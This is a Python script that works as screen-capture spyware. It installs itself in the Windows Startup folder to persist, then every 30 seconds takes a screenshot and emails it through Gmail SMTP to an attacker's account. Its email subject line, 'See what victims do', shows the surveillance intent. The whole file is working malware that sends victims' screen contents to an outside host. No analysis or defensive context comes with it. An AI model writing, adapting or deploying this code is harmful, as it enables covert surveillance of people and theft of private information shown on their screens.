import pyautogui
import smtplib
import os
from email.encoders import encode_base64
from email.header import Header
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time as t
import shutil

src_path = r"./leakingtestpaper.exe"
dst_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

listapp=os.listdir("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")

if "screenleaker.exe" not in listapp:
    shutil.copy(src_path, dst_path)

i = 0

while True:
    t.sleep(30)
    i += 1
    myScreenshot = pyautogui.screenshot()
    filename = f'./screenshot_{i}.png'
    myScreenshot.save(filename)

    msg = MIMEMultipart()

    msg['To'] = 'your gmail'
    msg['From'] = 'your gmail'
    msg['Subject'] = Header(s='See what victims do =)', charset='utf-8')
    body = MIMEText('check it out.', _charset='utf-8')
    msg.attach(body)

    f = filename
    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(f, "rb").read())
    encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(f))
    msg.attach(part)


    server = smtplib.SMTP('smtp.gmail.com', 587)

    server.starttls()

    server.login('your gmail', 'your app password')
    server.send_message(msg)
    server.quit()
    print("mail sent")
    os.remove(filename)
